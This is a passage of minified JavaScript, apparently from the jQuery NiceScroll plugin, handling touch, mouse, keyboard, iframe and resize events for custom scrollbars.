							var w = v.isfixed ? "fixed" : "absolute";
							v.isfixed || (v.viewport = v.getViewport(v.win[0])), v.viewport && (v.body = v.viewport, 0 == /fixed|absolute/.test(v.viewport.css("position")) && v.css(v.viewport, {
								position: "relative"
							})), t.css({
								position: w
							}), v.zoom && v.zoom.css({
								position: w
							}), v.updateScrollBar(), v.body.append(t), v.zoom && v.body.append(v.zoom), v.railh && (f.css({
								position: w
							}), v.body.append(f))
						}
						x.isios && v.css(v.win, {
							"-webkit-tap-highlight-color": "rgba(0,0,0,0)",
							"-webkit-touch-callout": "none"
						}), x.isie && v.opt.disableoutline && v.win.attr("hideFocus", "true"), x.iswebkit && v.opt.disableoutline && v.win.css({
							outline: "none"
						})
					}
					if (v.opt.autohidemode === !1 ? (v.autohidedom = !1, v.rail.css({
							opacity: v.opt.cursoropacitymax
						}), v.railh && v.railh.css({
							opacity: v.opt.cursoropacitymax
						})) : v.opt.autohidemode === !0 || "leave" === v.opt.autohidemode ? (v.autohidedom = a().add(v.rail), x.isie8 && (v.autohidedom = v.autohidedom.add(v.cursor)), v.railh && (v.autohidedom = v.autohidedom.add(v.railh)), v.railh && x.isie8 && (v.autohidedom = v.autohidedom.add(v.cursorh))) : "scroll" == v.opt.autohidemode ? (v.autohidedom = a().add(v.rail), v.railh && (v.autohidedom = v.autohidedom.add(v.railh))) : "cursor" == v.opt.autohidemode ? (v.autohidedom = a().add(v.cursor), v.railh && (v.autohidedom = v.autohidedom.add(v.cursorh))) : "hidden" == v.opt.autohidemode && (v.autohidedom = !1, v.hide(), v.railslocked = !1), x.isie9mobile) {
						v.scrollmom = new b(v), v.onmangotouch = function() {
							var e = v.getScrollTop(),
								o = v.getScrollLeft();
							if (e == v.scrollmom.lastscrolly && o == v.scrollmom.lastscrollx) return !0;
							var t = e - v.mangotouch.sy,
								r = o - v.mangotouch.sx,
								i = Math.round(Math.sqrt(Math.pow(r, 2) + Math.pow(t, 2)));
							if (0 != i) {
								var n = 0 > t ? -1 : 1,
									s = 0 > r ? -1 : 1,
									l = +new Date;
								if (v.mangotouch.lazy && clearTimeout(v.mangotouch.lazy), l - v.mangotouch.tm > 80 || v.mangotouch.dry != n || v.mangotouch.drx != s) v.scrollmom.stop(), v.scrollmom.reset(o, e), v.mangotouch.sy = e, v.mangotouch.ly = e, v.mangotouch.sx = o, v.mangotouch.lx = o, v.mangotouch.dry = n, v.mangotouch.drx = s, v.mangotouch.tm = l;
								else {
									v.scrollmom.stop(), v.scrollmom.update(v.mangotouch.sx - r, v.mangotouch.sy - t), v.mangotouch.tm = l;
									var a = Math.max(Math.abs(v.mangotouch.ly - e), Math.abs(v.mangotouch.lx - o));
									v.mangotouch.ly = e, v.mangotouch.lx = o, a > 2 && (v.mangotouch.lazy = setTimeout(function() {
										v.mangotouch.lazy = !1, v.mangotouch.dry = 0, v.mangotouch.drx = 0, v.mangotouch.tm = 0, v.scrollmom.doMomentum(30)
									}, 100))
								}
							}
						};
						var y = v.getScrollTop(),
							S = v.getScrollLeft();
						v.mangotouch = {
							sy: y,
							ly: y,
							dry: 0,
							sx: S,
							lx: S,
							drx: 0,
							lazy: !1,
							tm: 0
						}, v.bind(v.docscroll, "scroll", v.onmangotouch)
					} else {
						if (x.cantouch || v.istouchcapable || v.opt.touchbehavior || x.hasmstouch) {
							v.scrollmom = new b(v), v.ontouchstart = function(e) {
								if (e.pointerType && 2 != e.pointerType && "touch" != e.pointerType) return !1;
								if (v.hasmoving = !1, !v.railslocked) {
									var o;
									if (x.hasmstouch)
										for (o = e.target ? e.target : !1; o;) {
											var t = a(o).getNiceScroll();
											if (t.length > 0 && t[0].me == v.me) break;
											if (t.length > 0) return !1;
											if ("DIV" == o.nodeName && o.id == v.id) break;
											o = o.parentNode ? o.parentNode : !1
										}
									if (v.cancelScroll(), o = v.getTarget(e)) {
										var r = /INPUT/i.test(o.nodeName) && /range/i.test(o.type);
										if (r) return v.stopPropagation(e)
									}
									if (!("clientX" in e) && "changedTouches" in e && (e.clientX = e.changedTouches[0].clientX, e.clientY = e.changedTouches[0].clientY), v.forcescreen) {
										var i = e;
										e = {
											original: e.original ? e.original : e
										}, e.clientX = i.screenX, e.clientY = i.screenY
									}
									if (v.rail.drag = {
											x: e.clientX,
											y: e.clientY,
											sx: v.scroll.x,
											sy: v.scroll.y,
											st: v.getScrollTop(),
											sl: v.getScrollLeft(),
											pt: 2,
											dl: !1
										}, v.ispage || !v.opt.directionlockdeadzone) v.rail.drag.dl = "f";
									else {
										var n = {
												w: a(window).width(),
												h: a(window).height()
											},
											s = {
												w: Math.max(document.body.scrollWidth, document.documentElement.scrollWidth),
												h: Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
											},
											l = Math.max(0, s.h - n.h),
											c = Math.max(0, s.w - n.w);
										!v.rail.scrollable && v.railh.scrollable ? v.rail.drag.ck = l > 0 ? "v" : !1 : v.rail.scrollable && !v.railh.scrollable ? v.rail.drag.ck = c > 0 ? "h" : !1 : v.rail.drag.ck = !1, v.rail.drag.ck || (v.rail.drag.dl = "f")
									}
									if (v.opt.touchbehavior && v.isiframe && x.isie) {
										var d = v.win.position();
										v.rail.drag.x += d.left, v.rail.drag.y += d.top
									}
									if (v.hasmoving = !1, v.lastmouseup = !1, v.scrollmom.reset(e.clientX, e.clientY), !x.cantouch && !this.istouchcapable && !e.pointerType) {
										var u = o ? /INPUT|SELECT|TEXTAREA/i.test(o.nodeName) : !1;
										if (!u) return !v.ispage && x.hasmousecapture && o.setCapture(), v.opt.touchbehavior ? (o.onclick && !o._onclick && (o._onclick = o.onclick, o.onclick = function(e) {
											return v.hasmoving ? !1 : void o._onclick.call(this, e)
										}), v.cancelEvent(e)) : v.stopPropagation(e);
										/SUBMIT|CANCEL|BUTTON/i.test(a(o).attr("type")) && (pc = {
											tg: o,
											click: !1
										}, v.preventclick = pc)
									}
								}
							}, v.ontouchend = function(e) {
								if (!v.rail.drag) return !0;
								if (2 == v.rail.drag.pt) {
									if (e.pointerType && 2 != e.pointerType && "touch" != e.pointerType) return !1;
									if (v.scrollmom.doMomentum(), v.rail.drag = !1, v.hasmoving && (v.lastmouseup = !0, v.hideCursor(), x.hasmousecapture && document.releaseCapture(), !x.cantouch)) return v.cancelEvent(e)
								} else if (1 == v.rail.drag.pt) return v.onmouseup(e)
							};
							var z = v.opt.touchbehavior && v.isiframe && !x.hasmousecapture;
							v.ontouchmove = function(e, o) {
								if (!v.rail.drag) return !1;
								if (e.targetTouches && v.opt.preventmultitouchscrolling && e.targetTouches.length > 1) return !1;
								if (e.pointerType && 2 != e.pointerType && "touch" != e.pointerType) return !1;
								if (2 == v.rail.drag.pt) {
									if (x.cantouch && x.isios && "undefined" == typeof e.original) return !0;
									v.hasmoving = !0, v.preventclick && !v.preventclick.click && (v.preventclick.click = v.preventclick.tg.onclick || !1, v.preventclick.tg.onclick = v.onpreventclick);
									var t = a.extend({
										original: e
									}, e);
									if (e = t, "changedTouches" in e && (e.clientX = e.changedTouches[0].clientX, e.clientY = e.changedTouches[0].clientY), v.forcescreen) {
										var r = e;
										e = {
											original: e.original ? e.original : e
										}, e.clientX = r.screenX, e.clientY = r.screenY
									}
									var i, n;
									if (n = i = 0, z && !o) {
										var s = v.win.position();
										n = -s.left, i = -s.top
									}
									var l = e.clientY + i,
										c = l - v.rail.drag.y,
										d = e.clientX + n,
										u = d - v.rail.drag.x,
										h = v.rail.drag.st - c;
									v.ishwscroll && v.opt.bouncescroll ? 0 > h ? h = Math.round(h / 2) : h > v.page.maxh && (h = v.page.maxh + Math.round((h - v.page.maxh) / 2)) : (0 > h && (h = 0, l = 0), h > v.page.maxh && (h = v.page.maxh, l = 0));
									var p;
									v.railh && v.railh.scrollable && (p = v.isrtlmode ? u - v.rail.drag.sl : v.rail.drag.sl - u, v.ishwscroll && v.opt.bouncescroll ? 0 > p ? p = Math.round(p / 2) : p > v.page.maxw && (p = v.page.maxw + Math.round((p - v.page.maxw) / 2)) : (0 > p && (p = 0, d = 0), p > v.page.maxw && (p = v.page.maxw, d = 0)));
									var m = !1;
									if (v.rail.drag.dl) m = !0, "v" == v.rail.drag.dl ? p = v.rail.drag.sl : "h" == v.rail.drag.dl && (h = v.rail.drag.st);
									else {
										var f = Math.abs(c),
											g = Math.abs(u),
											w = v.opt.directionlockdeadzone;
										if ("v" == v.rail.drag.ck) {
											if (f > w && .3 * f >= g) return v.rail.drag = !1, !0;
											g > w && (v.rail.drag.dl = "f", a("body").scrollTop(a("body").scrollTop()))
										} else if ("h" == v.rail.drag.ck) {
											if (g > w && .3 * g >= f) return v.rail.drag = !1, !0;
											f > w && (v.rail.drag.dl = "f", a("body").scrollLeft(a("body").scrollLeft()))
										}
									}
									if (v.synched("touchmove", function() {
											v.rail.drag && 2 == v.rail.drag.pt && (v.prepareTransition && v.prepareTransition(0), v.rail.scrollable && v.setScrollTop(h), v.scrollmom.update(d, l), v.railh && v.railh.scrollable ? (v.setScrollLeft(p), v.showCursor(h, p)) : v.showCursor(h), x.isie10 && document.selection.clear())
										}), x.ischrome && v.istouchcapable && (m = !1), m) return v.cancelEvent(e)
								} else if (1 == v.rail.drag.pt) return v.onmousemove(e)
							}
						}
						if (v.onmousedown = function(e, o) {
								if (!v.rail.drag || 1 == v.rail.drag.pt) {
									if (v.railslocked) return v.cancelEvent(e);
									v.cancelScroll(), v.rail.drag = {
										x: e.clientX,
										y: e.clientY,
										sx: v.scroll.x,
										sy: v.scroll.y,
										pt: 1,
										hr: !!o
									};
									var t = v.getTarget(e);
									return !v.ispage && x.hasmousecapture && t.setCapture(), v.isiframe && !x.hasmousecapture && (v.saved.csspointerevents = v.doc.css("pointer-events"), v.css(v.doc, {
										"pointer-events": "none"
									})), v.hasmoving = !1, v.cancelEvent(e)
								}
							}, v.onmouseup = function(e) {
								return v.rail.drag ? 1 != v.rail.drag.pt ? !0 : (x.hasmousecapture && document.releaseCapture(), v.isiframe && !x.hasmousecapture && v.doc.css("pointer-events", v.saved.csspointerevents), v.rail.drag = !1, v.hasmoving && v.triggerScrollEnd(), v.cancelEvent(e)) : void 0
							}, v.onmousemove = function(e) {
								if (v.rail.drag) {
									if (1 != v.rail.drag.pt) return;
									if (x.ischrome && 0 == e.which) return v.onmouseup(e);
									if (v.cursorfreezed = !0, v.hasmoving = !0, v.rail.drag.hr) {
										v.scroll.x = v.rail.drag.sx + (e.clientX - v.rail.drag.x), v.scroll.x < 0 && (v.scroll.x = 0);
										var o = v.scrollvaluemaxw;
										v.scroll.x > o && (v.scroll.x = o)
									} else {
										v.scroll.y = v.rail.drag.sy + (e.clientY - v.rail.drag.y), v.scroll.y < 0 && (v.scroll.y = 0);
										var t = v.scrollvaluemax;
										v.scroll.y > t && (v.scroll.y = t)
									}
									return v.synched("mousemove", function() {
										v.rail.drag && 1 == v.rail.drag.pt && (v.showCursor(), v.rail.drag.hr ? v.hasreversehr ? v.doScrollLeft(v.scrollvaluemaxw - Math.round(v.scroll.x * v.scrollratio.x), v.opt.cursordragspeed) : v.doScrollLeft(Math.round(v.scroll.x * v.scrollratio.x), v.opt.cursordragspeed) : v.doScrollTop(Math.round(v.scroll.y * v.scrollratio.y), v.opt.cursordragspeed))
									}), v.cancelEvent(e)
								}
								v.checkarea = 0
							}, x.cantouch || v.opt.touchbehavior) v.onpreventclick = function(e) {
							return v.preventclick ? (v.preventclick.tg.onclick = v.preventclick.click, v.preventclick = !1, v.cancelEvent(e)) : void 0
						}, v.bind(v.win, "mousedown", v.ontouchstart), v.onclick = x.isios ? !1 : function(e) {
							return v.lastmouseup ? (v.lastmouseup = !1, v.cancelEvent(e)) : !0
						}, v.opt.grabcursorenabled && x.cursorgrabvalue && (v.css(v.ispage ? v.doc : v.win, {
							cursor: x.cursorgrabvalue
						}), v.css(v.rail, {
							cursor: x.cursorgrabvalue
						}));
						else {
							var T = function(e) {
								if (v.selectiondrag) {
									if (e) {
										var o = v.win.outerHeight(),
											t = e.pageY - v.selectiondrag.top;
										t > 0 && o > t && (t = 0), t >= o && (t -= o), v.selectiondrag.df = t
									}
									if (0 != v.selectiondrag.df) {
										var r = 2 * -Math.floor(v.selectiondrag.df / 6);
										v.doScrollBy(r), v.debounced("doselectionscroll", function() {
											T()
										}, 50)
									}
								}
							};
							"getSelection" in document ? v.hasTextSelected = function() {
								return document.getSelection().rangeCount > 0
							} : "selection" in document ? v.hasTextSelected = function() {
								return "None" != document.selection.type
							} : v.hasTextSelected = function() {
								return !1
							}, v.onselectionstart = function(e) {
								v.ispage || (v.selectiondrag = v.win.offset())
							}, v.onselectionend = function(e) {
								v.selectiondrag = !1
							}, v.onselectiondrag = function(e) {
								v.selectiondrag && v.hasTextSelected() && v.debounced("selectionscroll", function() {
									T(e)
								}, 250)
							}
						}
						x.hasw3ctouch ? (v.css(v.rail, {
							"touch-action": "none"
						}), v.css(v.cursor, {
							"touch-action": "none"
						}), v.bind(v.win, "pointerdown", v.ontouchstart), v.bind(document, "pointerup", v.ontouchend), v.bind(document, "pointermove", v.ontouchmove)) : x.hasmstouch ? (v.css(v.rail, {
							"-ms-touch-action": "none"
						}), v.css(v.cursor, {
							"-ms-touch-action": "none"
						}), v.bind(v.win, "MSPointerDown", v.ontouchstart), v.bind(document, "MSPointerUp", v.ontouchend), v.bind(document, "MSPointerMove", v.ontouchmove), v.bind(v.cursor, "MSGestureHold", function(e) {
							e.preventDefault()
						}), v.bind(v.cursor, "contextmenu", function(e) {
							e.preventDefault()
						})) : this.istouchcapable && (v.bind(v.win, "touchstart", v.ontouchstart), v.bind(document, "touchend", v.ontouchend), v.bind(document, "touchcancel", v.ontouchend), v.bind(document, "touchmove", v.ontouchmove)), (v.opt.cursordragontouch || !x.cantouch && !v.opt.touchbehavior) && (v.rail.css({
							cursor: "default"
						}), v.railh && v.railh.css({
							cursor: "default"
						}), v.jqbind(v.rail, "mouseenter", function() {
							return v.ispage || v.win.is(":visible") ? (v.canshowonmouseevent && v.showCursor(), void(v.rail.active = !0)) : !1
						}), v.jqbind(v.rail, "mouseleave", function() {
							v.rail.active = !1, v.rail.drag || v.hideCursor()
						}), v.opt.sensitiverail && (v.bind(v.rail, "click", function(e) {
							v.doRailClick(e, !1, !1)
						}), v.bind(v.rail, "dblclick", function(e) {
							v.doRailClick(e, !0, !1)
						}), v.bind(v.cursor, "click", function(e) {
							v.cancelEvent(e)
						}), v.bind(v.cursor, "dblclick", function(e) {
							v.cancelEvent(e)
						})), v.railh && (v.jqbind(v.railh, "mouseenter", function() {
							return v.ispage || v.win.is(":visible") ? (v.canshowonmouseevent && v.showCursor(), void(v.rail.active = !0)) : !1
						}), v.jqbind(v.railh, "mouseleave", function() {
							v.rail.active = !1, v.rail.drag || v.hideCursor()
						}), v.opt.sensitiverail && (v.bind(v.railh, "click", function(e) {
							v.doRailClick(e, !1, !0)
						}), v.bind(v.railh, "dblclick", function(e) {
							v.doRailClick(e, !0, !0)
						}), v.bind(v.cursorh, "click", function(e) {
							v.cancelEvent(e)
						}), v.bind(v.cursorh, "dblclick", function(e) {
							v.cancelEvent(e)
						})))), x.cantouch || v.opt.touchbehavior ? (v.bind(x.hasmousecapture ? v.win : document, "mouseup", v.ontouchend), v.bind(document, "mousemove", v.ontouchmove), v.onclick && v.bind(document, "click", v.onclick), v.opt.cursordragontouch && (v.bind(v.cursor, "mousedown", v.onmousedown), v.bind(v.cursor, "mouseup", v.onmouseup), v.cursorh && v.bind(v.cursorh, "mousedown", function(e) {
							v.onmousedown(e, !0)
						}), v.cursorh && v.bind(v.cursorh, "mouseup", v.onmouseup))) : (v.bind(x.hasmousecapture ? v.win : document, "mouseup", v.onmouseup), v.bind(document, "mousemove", v.onmousemove), v.onclick && v.bind(document, "click", v.onclick), v.bind(v.cursor, "mousedown", v.onmousedown), v.bind(v.cursor, "mouseup", v.onmouseup), v.railh && (v.bind(v.cursorh, "mousedown", function(e) {
							v.onmousedown(e, !0)
						}), v.bind(v.cursorh, "mouseup", v.onmouseup)), !v.ispage && v.opt.enablescrollonselection && (v.bind(v.win[0], "mousedown", v.onselectionstart), v.bind(document, "mouseup", v.onselectionend), v.bind(v.cursor, "mouseup", v.onselectionend), v.cursorh && v.bind(v.cursorh, "mouseup", v.onselectionend), v.bind(document, "mousemove", v.onselectiondrag)), v.zoom && (v.jqbind(v.zoom, "mouseenter", function() {
							v.canshowonmouseevent && v.showCursor(), v.rail.active = !0
						}), v.jqbind(v.zoom, "mouseleave", function() {
							v.rail.active = !1, v.rail.drag || v.hideCursor()
						}))), v.opt.enablemousewheel && (v.isiframe || v.bind(x.isie && v.ispage ? document : v.win, "mousewheel", v.onmousewheel), v.bind(v.rail, "mousewheel", v.onmousewheel), v.railh && v.bind(v.railh, "mousewheel", v.onmousewheelhr)), v.ispage || x.cantouch || /HTML|^BODY/.test(v.win[0].nodeName) || (v.win.attr("tabindex") || v.win.attr({
								tabindex: n++
							}), v.jqbind(v.win, "focus", function(e) {
								r = v.getTarget(e).id || !0, v.hasfocus = !0, v.canshowonmouseevent && v.noticeCursor()
							}),
							v.jqbind(v.win, "blur", function(e) {
								r = !1, v.hasfocus = !1
							}), v.jqbind(v.win, "mouseenter", function(e) {
								i = v.getTarget(e).id || !0, v.hasmousefocus = !0, v.canshowonmouseevent && v.noticeCursor()
							}), v.jqbind(v.win, "mouseleave", function() {
								i = !1, v.hasmousefocus = !1, v.rail.drag || v.hideCursor()
							}))
					}
					if (v.onkeypress = function(e) {
							if (v.railslocked && 0 == v.page.maxh) return !0;
							e = e ? e : window.e;
							var o = v.getTarget(e);
							if (o && /INPUT|TEXTAREA|SELECT|OPTION/.test(o.nodeName)) {
								var t = o.getAttribute("type") || o.type || !1;
								if (!t || !/submit|button|cancel/i.tp) return !0
							}
							if (a(o).attr("contenteditable")) return !0;
							if (v.hasfocus || v.hasmousefocus && !r || v.ispage && !r && !i) {
								var n = e.keyCode;
								if (v.railslocked && 27 != n) return v.cancelEvent(e);
								var s = e.ctrlKey || !1,
									l = e.shiftKey || !1,
									c = !1;
								switch (n) {
									case 38:
									case 63233:
										v.doScrollBy(72), c = !0;
										break;
									case 40:
									case 63235:
										v.doScrollBy(-72), c = !0;
										break;
									case 37:
									case 63232:
										v.railh && (s ? v.doScrollLeft(0) : v.doScrollLeftBy(72), c = !0);
										break;
									case 39:
									case 63234:
										v.railh && (s ? v.doScrollLeft(v.page.maxw) : v.doScrollLeftBy(-72), c = !0);
										break;
									case 33:
									case 63276:
										v.doScrollBy(v.view.h), c = !0;
										break;
									case 34:
									case 63277:
										v.doScrollBy(-v.view.h), c = !0;
										break;
									case 36:
									case 63273:
										v.railh && s ? v.doScrollPos(0, 0) : v.doScrollTo(0), c = !0;
										break;
									case 35:
									case 63275:
										v.railh && s ? v.doScrollPos(v.page.maxw, v.page.maxh) : v.doScrollTo(v.page.maxh), c = !0;
										break;
									case 32:
										v.opt.spacebarenabled && (l ? v.doScrollBy(v.view.h) : v.doScrollBy(-v.view.h), c = !0);
										break;
									case 27:
										v.zoomactive && (v.doZoom(), c = !0)
								}
								if (c) return v.cancelEvent(e)
							}
						}, v.opt.enablekeyboard && v.bind(document, x.isopera && !x.isopera12 ? "keypress" : "keydown", v.onkeypress), v.bind(document, "keydown", function(e) {
							var o = e.ctrlKey || !1;
							o && (v.wheelprevented = !0)
						}), v.bind(document, "keyup", function(e) {
							var o = e.ctrlKey || !1;
							o || (v.wheelprevented = !1)
						}), v.bind(window, "blur", function(e) {
							v.wheelprevented = !1
						}), v.bind(window, "resize", v.lazyResize), v.bind(window, "orientationchange", v.lazyResize), v.bind(window, "load", v.lazyResize), x.ischrome && !v.ispage && !v.haswrapper) {
						var k = v.win.attr("style"),
							M = parseFloat(v.win.css("width")) + 1;
						v.win.css("width", M), v.synched("chromefix", function() {
							v.win.attr("style", k)
						})
					}
					v.onAttributeChange = function(e) {
						v.lazyResize(v.isieold ? 250 : 30)
					}, m !== !1 && (v.observerbody = new m(function(e) {
						return e.forEach(function(e) {
							return "attributes" == e.type ? a("body").hasClass("modal-open") && !a.contains(a(".modal-dialog")[0], v.doc[0]) ? v.hide() : v.show() : void 0
						}), document.body.scrollHeight != v.page.maxh ? v.lazyResize(30) : void 0
					}), v.observerbody.observe(document.body, {
						childList: !0,
						subtree: !0,
						characterData: !1,
						attributes: !0,
						attributeFilter: ["class"]
					})), v.ispage || v.haswrapper || (m !== !1 ? (v.observer = new m(function(e) {
						e.forEach(v.onAttributeChange)
					}), v.observer.observe(v.win[0], {
						childList: !0,
						characterData: !1,
						attributes: !0,
						subtree: !1
					}), v.observerremover = new m(function(e) {
						e.forEach(function(e) {
							if (e.removedNodes.length > 0)
								for (var o in e.removedNodes)
									if (v && e.removedNodes[o] == v.win[0]) return v.remove()
						})
					}), v.observerremover.observe(v.win[0].parentNode, {
						childList: !0,
						characterData: !1,
						attributes: !1,
						subtree: !1
					})) : (v.bind(v.win, x.isie && !x.isie9 ? "propertychange" : "DOMAttrModified", v.onAttributeChange), x.isie9 && v.win[0].attachEvent("onpropertychange", v.onAttributeChange), v.bind(v.win, "DOMNodeRemoved", function(e) {
						e.target == v.win[0] && v.remove()
					}))), !v.ispage && v.opt.boxzoom && v.bind(window, "resize", v.resizeZoom), v.istextarea && (v.bind(v.win, "keydown", v.lazyResize), v.bind(v.win, "mouseup", v.lazyResize)), v.lazyResize(30)
				}
				if ("IFRAME" == this.doc[0].nodeName) {
					var E = function() {
						v.iframexd = !1;
						var e;
						try {
							e = "contentDocument" in this ? this.contentDocument : this.contentWindow.document;
							e.domain
						} catch (o) {
							v.iframexd = !0, e = !1
						}
						if (v.iframexd) return "console" in window && console.log("NiceScroll error: policy restriced iframe"), !0;
						if (v.forcescreen = !0, v.isiframe && (v.iframe = {
								doc: a(e),
								html: v.doc.contents().find("html")[0],
								body: v.doc.contents().find("body")[0]
							}, v.getContentSize = function() {
								return {
									w: Math.max(v.iframe.html.scrollWidth, v.iframe.body.scrollWidth),
									h: Math.max(v.iframe.html.scrollHeight, v.iframe.body.scrollHeight)
								}
							}, v.docscroll = a(v.iframe.body)), !x.isios && v.opt.iframeautoresize && !v.isiframe) {
							v.win.scrollTop(0), v.doc.height("");
							var t = Math.max(e.getElementsByTagName("html")[0].scrollHeight, e.body.scrollHeight);
							v.doc.height(t)
						}
						v.lazyResize(30), x.isie7 && v.css(a(v.iframe.html), {
							"overflow-y": "hidden"
						}), v.css(a(v.iframe.body), {
							"overflow-y": "hidden"
						}), x.isios && v.haswrapper && v.css(a(e.body), {
							"-webkit-transform": "translate3d(0,0,0)"
						}), "contentWindow" in this ? v.bind(this.contentWindow, "scroll", v.onscroll) : v.bind(e, "scroll", v.onscroll), v.opt.enablemousewheel && v.bind(e, "mousewheel", v.onmousewheel), v.opt.enablekeyboard && v.bind(e, x.isopera ? "keypress" : "keydown", v.onkeypress), (x.cantouch || v.opt.touchbehavior) && (v.bind(e, "mousedown", v.ontouchstart), v.bind(e, "mousemove", function(e) {
							return v.ontouchmove(e, !0)
						}), v.opt.grabcursorenabled && x.cursorgrabvalue && v.css(a(e.body), {
							cursor: x.cursorgrabvalue
						})), v.bind(e, "mouseup", v.ontouchend), v.zoom && (v.opt.dblclickzoom && v.bind(e, "dblclick", v.doZoom), v.ongesturezoom && v.bind(e, "gestureend", v.ongesturezoom))
					};
					this.doc[0].readyState && "complete" == this.doc[0].readyState && setTimeout(function() {
						E.call(v.doc[0], !1)
					}, 500), v.bind(this.doc, "load", E)
				}
			}, this.showCursor = function(e, o) {
				if (v.cursortimeout && (clearTimeout(v.cursortimeout), v.cursortimeout = 0), v.rail) {
					if (v.autohidedom && (v.autohidedom.stop().css({
							opacity: v.opt.cursoropacitymax
						}), v.cursoractive = !0), v.rail.drag && 1 == v.rail.drag.pt || ("undefined" != typeof e && e !== !1 && (v.scroll.y = Math.round(1 * e / v.scrollratio.y)), "undefined" != typeof o && (v.scroll.x = Math.round(1 * o / v.scrollratio.x))), v.cursor.css({
							height: v.cursorheight,
							top: v.scroll.y
						}), v.cursorh) {
						var t = v.hasreversehr ? v.scrollvaluemaxw - v.scroll.x : v.scroll.x;
						!v.rail.align && v.rail.visibility ? v.cursorh.css({
							width: v.cursorwidth,
							left: t + v.rail.width
						}) : v.cursorh.css({
							width: v.cursorwidth,
							left: t
						}), v.cursoractive = !0
					}
					v.zoom && v.zoom.stop().css({
						opacity: v.opt.cursoropacitymax
					})
				}
			}, this.hideCursor = function(e) {
				v.cursortimeout || v.rail && v.autohidedom && (v.hasmousefocus && "leave" == v.opt.autohidemode || (v.cursortimeout = setTimeout(function() {
					v.rail.active && v.showonmouseevent || (v.autohidedom.stop().animate({
						opacity: v.opt.cursoropacitymin
					}), v.zoom && v.zoom.stop().animate({
						opacity: v.opt.cursoropacitymin
					}), v.cursoractive = !1), v.cursortimeout = 0
				}, e || v.opt.hidecursordelay)))
			}, this.noticeCursor = function(e, o, t) {
				v.showCursor(o, t), v.rail.active || v.hideCursor(e)
			}, this.getContentSize = v.ispage ? function() {
				return {
					w: Math.max(document.body.scrollWidth, document.documentElement.scrollWidth),
					h: Math.max(document.body.scrollHeight, document.documentElement.scrollHeight)
				}
			} : v.haswrapper ? function() {
				return {
					w: v.doc.outerWidth() + parseInt(v.win.css("paddingLeft")) + parseInt(v.win.css("paddingRight")),
					h: v.doc.outerHeight() + parseInt(v.win.css("paddingTop")) + parseInt(v.win.css("paddingBottom"))
				}
			} : function() {
				return {
					w: v.docscroll[0].scrollWidth,
					h: v.docscroll[0].scrollHeight
				}
			}, this.onResize = function(e, o) {
				if (!v || !v.win) return !1;
				if (!v.haswrapper && !v.ispage) {
					if ("none" == v.win.css("display")) return v.visibility && v.hideRail().hideRailHr(), !1;
					v.hidden || v.visibility || v.showRail().showRailHr()
				}
				var t = v.page.maxh,
					r = v.page.maxw,
					i = {
						h: v.view.h,
						w: v.view.w
					};
				if (v.view = {
						w: v.ispage ? v.win.width() : parseInt(v.win[0].clientWidth),
						h: v.ispage ? v.win.height() : parseInt(v.win[0].clientHeight)
					}, v.page = o ? o : v.getContentSize(), v.page.maxh = Math.max(0, v.page.h - v.view.h), v.page.maxw = Math.max(0, v.page.w - v.view.w), v.page.maxh == t && v.page.maxw == r && v.view.w == i.w && v.view.h == i.h) {
					if (v.ispage) return v;
					var n = v.win.offset();
					if (v.lastposition) {
						var s = v.lastposition;
						if (s.top == n.top && s.left == n.left) return v
					}
					v.lastposition = n
				}
				if (0 == v.page.maxh ? (v.hideRail(), v.scrollvaluemax = 0, v.scroll.y = 0, v.scrollratio.y = 0, v.cursorheight = 0, v.setScrollTop(0), v.rail && (v.rail.scrollable = !1)) : (v.page.maxh -= v.opt.railpadding.top + v.opt.railpadding.bottom, v.rail.scrollable = !0), 0 == v.page.maxw ? (v.hideRailHr(), v.scrollvaluemaxw = 0, v.scroll.x = 0, v.scrollratio.x = 0, v.cursorwidth = 0, v.setScrollLeft(0), v.railh && (v.railh.scrollable = !1)) : (v.page.maxw -= v.opt.railpadding.left + v.opt.railpadding.right, v.railh && (v.railh.scrollable = v.opt.horizrailenabled)), v.railslocked = v.locked || 0 == v.page.maxh && 0 == v.page.maxw, v.railslocked) return v.ispage || v.updateScrollBar(v.view), !1;
				v.hidden || v.visibility ? !v.railh || v.hidden || v.railh.visibility || v.showRailHr() : v.showRail().showRailHr(), v.istextarea && v.win.css("resize") && "none" != v.win.css("resize") && (v.view.h -= 20), v.cursorheight = Math.min(v.view.h, Math.round(v.view.h * (v.view.h / v.page.h))), v.cursorheight = v.opt.cursorfixedheight ? v.opt.cursorfixedheight : Math.max(v.opt.cursorminheight, v.cursorheight), v.cursorwidth = Math.min(v.view.w, Math.round(v.view.w * (v.view.w / v.page.w))), v.cursorwidth = v.opt.cursorfixedheight ? v.opt.cursorfixedheight : Math.max(v.opt.cursorminheight, v.cursorwidth), v.scrollvaluemax = v.view.h - v.cursorheight - v.cursor.hborder - (v.opt.railpadding.top + v.opt.railpadding.bottom), v.railh && (v.railh.width = v.page.maxh > 0 ? v.view.w - v.rail.width : v.view.w, v.scrollvaluemaxw = v.railh.width - v.cursorwidth - v.cursorh.wborder - (v.opt.railpadding.left + v.opt.railpadding.right)), v.ispage || v.updateScrollBar(v.view), v.scrollratio = {
					x: v.page.maxw / v.scrollvaluemaxw,
					y: v.page.maxh / v.scrollvaluemax
				};
				var l = v.getScrollTop();
				return l > v.page.maxh ? v.doScrollTop(v.page.maxh) : (v.scroll.y = Math.round(v.getScrollTop() * (1 / v.scrollratio.y)), v.scroll.x = Math.round(v.getScrollLeft() * (1 / v.scrollratio.x)), v.cursoractive && v.noticeCursor()), v.scroll.y && 0 == v.getScrollTop() && v.doScrollTo(Math.floor(v.scroll.y * v.scrollratio.y)), v
			}, this.resize = v.onResize, this.lazyResize = function(e) {
				return e = isNaN(e) ? 30 : e, v.debounced("resize", v.resize, e), v
			}, this.jqbind = function(e, o, t) {
				v.events.push({
					e: e,
					n: o,
					f: t,
					q: !0
				}), a(e).bind(o, t)
			}, this.bind = function(e, o, t, r) {
				var i = "jquery" in e ? e[0] : e;
				if ("mousewheel" == o)
					if ("onwheel" in v.win) v._bind(i, "wheel", t, r || !1);
					else {
						var n = "undefined" != typeof document.onmousewheel ? "mousewheel" : "DOMMouseScroll";
						p(i, n, t, r || !1), "DOMMouseScroll" == n && p(i, "MozMousePixelScroll", t, r || !1)
					}
				else if (i.addEventListener) {
					if (x.cantouch && /mouseup|mousedown|mousemove/.test(o)) {
						var s = "mousedown" == o ? "touchstart" : "mouseup" == o ? "touchend" : "touchmove";
						v._bind(i, s, function(e) {
							if (e.touches) {
								if (e.touches.length < 2) {
									var o = e.touches.length ? e.touches[0] : e;
									o.original = e, t.call(this, o)
								}
							} else if (e.changedTouches) {
